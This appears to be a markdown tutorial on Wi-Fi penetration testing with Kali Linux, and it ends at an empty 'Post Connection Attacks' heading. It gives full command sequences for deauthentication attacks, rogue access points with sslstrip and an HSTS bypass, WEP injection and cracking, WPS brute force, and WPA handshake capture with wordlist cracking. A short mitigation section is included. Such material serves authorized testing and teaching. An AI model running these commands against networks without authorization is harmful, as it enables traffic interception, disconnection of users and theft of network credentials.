# Wi-Fi & Wired Hacking 

All of the following requires tools that are default installed on Kali Linux. </br>
You can set up a VirtualBox instance with Kali and run as a NAT network to </br>
experiment with these tools. Use only on Networks that you have permission </br>
to pen test.

Virtual Machines to Install
```
https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
// MSEdge on Windows 10 Stable -> Virtual Box
```

Open Settings
```
Set up VMs on a NAT network
Kali should get 1 GB Ram, 1 CPU
Windows should get 2 GB Ram, 2 CPU
```

Snapshots (Storing state of a Virtual Machine)
```
Click the Snapshot Button
Click Take
This way you can come back later
```

Basic Linux Operations
```
// Update the source list
apt-get update
// Install Terminator
apt-get install terminator
// Install needed updates
apt-get upgrade
```

## Networks

Series of connected devices </br>
One device is a server, which contains data shared between devices </br>
In Wi-Fi, the server is the router and data is the internet </br>
All data is sent as packets over the air </br>
Anyone in range can sniff these

### Connecting Wireless Adapters to Kali

Built in network cards will not work with VMs </br>
Even if Kali is a main machine, you need an adapter for more powerful features </br>
You need to download the VirtualBox Oracle VM Extension Pack to get USB features </br>
Add the device in settings -> ports -> USB </br>
With Kali running, VirtualBox -> Devices -> USB, make sure adapter is checked </br>

## Packet Sniffing

### MAC Address

- Media Access Control, A physical static address assigned by the network card manufacturer
- Used by devices to identify each other & transfer packets to the right place
- Each packet has a source & destination

#### Changing your MAC Address

MAC addresses are static, so they can only be changed temporarily in the RAM.</br>
This may help you avoid blacklists or align with whitelists.

```
$ iwconfig
$ ifconfig wlan0 down		// Disable wireless card
$ macchanger --help			// View macchanger help
$ macchanger --random wlan0	// Get a random MAC for wlan0
$ macchanger wlan0 up		// Enable wireless card
```

Two ways to capture packets
- Managed mode, which only gets packets with your MAC address
- Monitor mode, which grabs all packets within Wi-Fi range

### Airodump-ng

Part of the Aircrack-ng package. It's a packet sniffer that captures all traffic within
range. We can also scan and gather info about wifi networks around us.

```
// enable monitor mode
$ airmon-ng start [interface]
// start airodump-ng
$ airodump-ng [interface]
// stop monitor mode
$ airmon-ng stop [interface]
```

Manual monitor mode
```
$ ifconfig wlan0 down
$ iwconfig wlan0 mode monitor
$ ifconfig wlan0 up
$ airodump-ng wlan0
```

One more method
```
$ airmon-ng
$ ifconfig wlan0 down
$ airmon-ng check kill
$ airmon-ng start wlan0
$ iwconfig wlan0mon
```

Running airmon-ng
```
$ airodump-ng mon0
// Start sniffing traffic
BSSID - MAC address
PWR - How close the device is
Data - # of Useful packets
And various encryption forms

$ airodump-ng --channel [c] --bssid [b] --write [o] [interface]
// Example of specific target
// The second section contains clients associated with the access point
// The output will use 4 formats, including .cap, .csv & .xml
```

## Deauthentication Attacks

Disconnect any device from any network within the wi-fi range, even if the network
is protected with a key.

Hacker sends deauthentication packets to the router, pretending to be the target machine
by spoofing the MAC address.

Hacker simultaneously sends packets to the target machine (spoofing the router MAC address)
telling it to re-authenticate itself.

### Aireplay-ng

De-authenticate all clients
```
aireplay-ng --deauth [# of packets] -a [AP] [interface]
```

De-authenitcate specific client
```
aireplay-ng --deauth [# of packets] -a [AP] -c [target] [interface]
```

## Creating a Fake Access Point (honeypot)

Creating an open AP attracts many clients to automatically connect. We can sniff the
unencrypted traffic created by the clients.

Two cards required
- One network card needs to be connected to the internet
- Another card needs to broadcast as an access point (wi-fi card)

How it works

```
Client web request -> wi-fi card 2 (AP) -> wi-fi card 1 -> Internet
Internet web response -> wi-fi card 1 -> wi-fi card 2 (AP) -> Client
```

### Executing

#### Using airbase

```
$ apt-get install dnsmasq
// Server used to connect to the network
$ echo -e "interface=at0\ndhcp-range=192.168.0.50,192.168.0.150,12h" > /etc/dnsmasq.conf
// Modify config, set interface name & IP range, these are fake
$ airbase-ng -e [network name] -c [channel] [interface]
// creating the fake access point
$ ifconfig at0 192.168.0.1 up
// Bringing the fake AP up
$ iptables --flush
$ iptables --table nat --flush
$ iptables --delete-chain
$ iptables --table nat --delete-chain
// Removing the iptable rules
$ iptables -P FORWARD ACCEPT
// Enable packet forward in iptables
$ iptables -t nat -A POSTROUTING -o [internet interface] -j MASQUERADE
// Link the wifi card and the card thats connected to the internet
$ dnsmasq
// start the server
$ echo "1" > /proc/sys/net/ipv4/ip_forward
// enable IP forwarding
```

#### Using Mana-Toolkit

Simplifies process. Creates new AP with sslstrip/firelamp & attempts to bypass HSTS.
```
$ start_noupstream	// AP, no internet
$ start-nat-simple	// AP, internet in upstream interface
$ start-nat-full	// AP w/ internet + sslstrip, sslsplit, firelamp, & HSTS bypass
$ apt-get install mana-toolkit
$ gedit /etc/mana-toolkit/hostapd-mana.conf
$ gedit /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
$ bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
```

### Accessing Encrypted Networks

#### WEP Cracking

WEP is an old encryption, but still used.

- RC4 Algorithm, each packet encrypted at AP and decrypted at the client.
- Each packet has a unique stream with a random 24-bit IV (Initializing Vector)
- IV is in plain text
- With 2+ packets with the same IV, we can use statistical attacks to crack

```
// Log all traffic from the network
$ airodump-ng -channel 6 -bssid 11:22:33:44:55:66 -write out mon0
// Crack the WEP key
$ aircrack-ng out-01.cap
// Remove the colons from the key and you can use as the WEP key
```

#### WEP Packet Injection

If there are no clients or the AP is idle, we need to inject packets.

Always needed - Authenticate our wifi card with the AP
```
// aireplay-ng --fakeauth 0 -a [target MAC] -h [your MAC] [interface]
$ aireplay-ng --fakeauth 0 -a E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0
```

Three Methods

1. ARP request reply

We wait for an ARP packet, then inject it into the traffic. The AP then generates
a new ARP packet with a new IV. We repeat the process until we have enough IVs.
```
$ aireplay-ng --arpreplay -b E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0
```

2. Korek Chop Chop

- Works with weak signals
- More complex
- Three steps
		- Determine packet key stream
		- Forge new packet
		- Inject it into the traffic
```
// Get the keystream
$ aireplay-ng --chopchop -b 00:10:18:90:2D:EE -h 00:c0:ca:6c:ca:12 mon0
// Forge the packet, IPs are needed, but can be set to 255
$ packetforge-ng -0 -a E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-0824-110731.xor -w chopchopforgedpacket
// Inject the packet into the network
$ aireplay-ng -2 -r chopchopforgedpacket mon0
```

3. Fragmentation Attack

Obtains 1500 bytes of the PRGA (pseudo random generation algorithm), forges a new packet
and injects them into the traffic to generate new IVs.

```
// Obtain PRGA
$ aireplay-ng --fragment -b E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0
// Forge a new Packet
$ packetforge-ng -0 -a E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w fragmentpacket
// Inject forged packet into the traffic
$ aireplay-ng -2 -r fragmentpacket mon0
```

### WPA Cracking

- Designed to fix WEP issues & improve encryption
- Each packet encrypted with a unique temporary key, so # of packets is irrelevant
- WPA & WPA2 are similar

#### WPS Feature

- Allows for easy connections using a button press
- 8 digit long pin for authentication
- Brute force in < 10 hours
- Reaver can then recover the WPA key from this pin

```
// Search for devices with WPS enabled
$ wash -i mon0
// Use Reaver to recover WPA key
$ reaver -b E0:69:95:B8:BF:77 -c 11 -i mon0
```

#### Capture Handshake

- WPA packet capture is not useful
- Only packets that contain info are the handshake packets
- Four-Way handshake every time a client connects to AP
- We can launch a wordlist attack using aircrack against the handshake

```
// Capture traffic
$ airodump-ng -channel 6 -bssid 11:22:33:44:55:66 -write out mon0
// De-authenticate a client so they have to reconnect
$ aireplay-ng --deauth 4 -a [AP] -c [target] [interface]
```

#### Wordlist

Crunch - Create your own wordlist

```
./crunch [min] [max] [characters=lower|upper|numbers|symbols] -t [pattern] -o file
./crunch 6 8 123456!"$& -o wordlist -t a@@@@b
// In this example, starts with a ends with b
```

#### Cracking the key

```
$ aircrack-ng [Handshake File] -w [WORDLIST] [Interface]
$ aircrack-ng is-01.cap -w list mon0
```

Combine each password in the wordlist with AP name (essid) to compute Pairwise Master Key (PMK)
using the pbkdf2 algorithm. We can do this to save time if no clients are on the network and we
have to wait for them.

```
// Create a new DB with passwords imported
$ airolib-ng test-db --import passwd wpa-wordlist
// Put essid into file
$ echo "test-ap" > test-essid
// Put essid into database
$ airolib-ng test-db --import essid test-essid
// Create PMKs
$ airolib-ng test-db --batch
// Crack the password, it will be much faster with this previous work done
$ aircrack-ng -r test-db test-handshake-01.cap
```

#### Faster cracking with Hash Cat

Hashcat uses the GPU rather than CPU for cracking

```
https://hashcat.net/oclhashcat/
https://hashcat.net/hashcat-gui/
https://hashcat.net/cap2hccap
```

## Mitigating Risks & Securing your Network

1. Don't use WEP
2. Don't enable WPS
3. Use WPA2 with a complex password

### Accessing your router

Usually your subnet + .1
```
192.168.0.1
// Subnet is first 3 numbers
```

You can fix the settings to your desire. You can add access controls for MAC addresses.

## Post Connection Attacks














